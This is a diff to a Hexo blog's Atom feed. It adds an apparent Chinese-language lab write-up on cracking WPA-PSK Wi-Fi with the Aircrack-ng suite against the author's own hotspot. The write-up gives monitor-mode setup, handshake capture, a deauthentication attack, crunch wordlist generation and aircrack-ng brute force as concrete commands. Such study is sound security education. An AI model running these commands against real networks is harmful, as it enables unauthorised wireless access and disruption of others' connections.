@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-04-09T15:03:48.802Z</updated>
+  <updated>2023-04-10T08:39:32.990Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>WIFI密码破解</title>
+    <link href="http://example.com/2023/04/10/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+    <id>http://example.com/2023/04/10/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
+    <published>2023-04-10T08:21:34.000Z</published>
+    <updated>2023-04-10T08:39:32.990Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>利用Aircrack-ng套件破解WPA-PSK加密无线网络，了解WPA-PSK破解方法。</p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>WPA（Wi-Fi Protected Access，Wi-Fi保护访问）的加密方式有两种，TKIP(Temporal KeyIntegrity Protocol，临时密钥完整协议)和AES-CCMP(Advanced Encryption Standard-CounterCBC-MAC Protocol，高级加密标准-计数器模式密码块链信息认证协议)。TKIP使用的算法仍是WEP采用的RC4算法，并在WEP密钥认证机制中添加了“信息包单加密功能”、“信息监测”、“具有序列功能的初始向量”和“密钥生成功能”等算法。但正是RC4加密方式的缺陷引起了大量安全问题。AES-CCMP没有再沿用WEP采用的RC4算法，它重新设计了Wi-Fi的加密方式，使用了AES这种迭代的、对称密钥分组的算法，没有TKIP所存在的大量潜在缺陷。</p><p>WPA认证机制有两种形式：WPA-PSK(WPA Pre-Shared Key，WPA的预共享密钥模式)以及WPA Enterprise(WPA的企业模式)，由于WPA Enterprise使用频率不高以及设备不足，本实验所说的WPA机制仅限于WPA Pre-Shared Key。在WPA-PSK机制中，其加密函数的输入是WPA的预共享密钥，无线网络接入点及客户端都知道该预共享密钥，预共享密钥（PSK）是8到63之间的ASCII字符。</p><span id="more"></span><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>首先开启热点Mate30 5G，用于充当目标AP进行攻击。</p><p>在kali-linux上执行以下命令，开启网卡的监控模式：</p><pre><code class="lang-shell">airmon-ng start wlan0ifconfig wlan0mon downiwconfig wlan0mon mode monitorifconfig wlan0mon upiwconfig wlan0mon</code></pre><p>然后输入airodump-ng wlan0mon进行wifi信号的嗅探，找到目标AP ”Mate30 5G“以及连接到它的设备：</p><p><img src="3.png" alt="3"></p><p>下面使用aireplay-ng进行DOS攻击，来获取WPA四次握手包，输入指令为aireplay-ng —deauth 8 -a &lt;热点的MAC&gt; -c &lt;连接的设备的MAC&gt; wlan0mon，但在此之前，需要输入以下命令来进行抓包：</p><pre><code class="lang-shell">airodump-ng -c &lt;AP的频道&gt; -w &lt;抓取握手包的存放位置&gt; --bssid &lt;AP的MAC地址&gt; &lt; monitor名称&gt;</code></pre><p>上面两条指令的目的在于抓到WAP的四次握手包，运行效果如下（左边为抓包，右边为DOS攻击）：</p><p><img src="1.png" alt="1"></p><p>最后使用aircrack-ng进行WPA-PSK的破解，用crunch工具生成一份字典：<code>crunch 10 10 qwert%%%%% &gt;&gt; pass.txt</code>，具体的字典生成可根据需要自行修改，比如指定正则表达式的结构等，在这里为了实验的方便，我设定密码的形式为前五位固定，后五位为数字。</p><p>然后输入<code>aircrack-ng -w pass.txt wpa2-01.cap</code>（此处的wpa2文件为抓包的保存文件），就可以对密码进行暴力的破解：</p><p><img src="2.png" alt="2"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;实验目的&quot;&gt;&lt;a href=&quot;#实验目的&quot; class=&quot;headerlink&quot; title=&quot;实验目的&quot;&gt;&lt;/a&gt;实验目的&lt;/h2&gt;&lt;p&gt;利用Aircrack-ng套件破解WPA-PSK加密无线网络，了解WPA-PSK破解方法。&lt;/p&gt;
+&lt;h2 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title=&quot;预备知识&quot;&gt;&lt;/a&gt;预备知识&lt;/h2&gt;&lt;p&gt;WPA（Wi-Fi Protected Access，Wi-Fi保护访问）的加密方式有两种，TKIP(Temporal KeyIntegrity Protocol，临时密钥完整协议)和AES-CCMP(Advanced Encryption Standard-CounterCBC-MAC Protocol，高级加密标准-计数器模式密码块链信息认证协议)。TKIP使用的算法仍是WEP采用的RC4算法，并在WEP密钥认证机制中添加了“信息包单加密功能”、“信息监测”、“具有序列功能的初始向量”和“密钥生成功能”等算法。但正是RC4加密方式的缺陷引起了大量安全问题。AES-CCMP没有再沿用WEP采用的RC4算法，它重新设计了Wi-Fi的加密方式，使用了AES这种迭代的、对称密钥分组的算法，没有TKIP所存在的大量潜在缺陷。&lt;/p&gt;
+&lt;p&gt;WPA认证机制有两种形式：WPA-PSK(WPA Pre-Shared Key，WPA的预共享密钥模式)以及WPA Enterprise(WPA的企业模式)，由于WPA Enterprise使用频率不高以及设备不足，本实验所说的WPA机制仅限于WPA Pre-Shared Key。在WPA-PSK机制中，其加密函数的输入是WPA的预共享密钥，无线网络接入点及客户端都知道该预共享密钥，预共享密钥（PSK）是8到63之间的ASCII字符。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="无线网络安全" scheme="http://example.com/categories/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="wifi安全" scheme="http://example.com/tags/wifi%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="WPA-PSK" scheme="http://example.com/tags/WPA-PSK/"/>
+    
+    <category term="aircrack-ng" scheme="http://example.com/tags/aircrack-ng/"/>
+    
+  </entry>
   
   <entry>
     <title>IotGoat漏洞挖掘--Web注入</title>
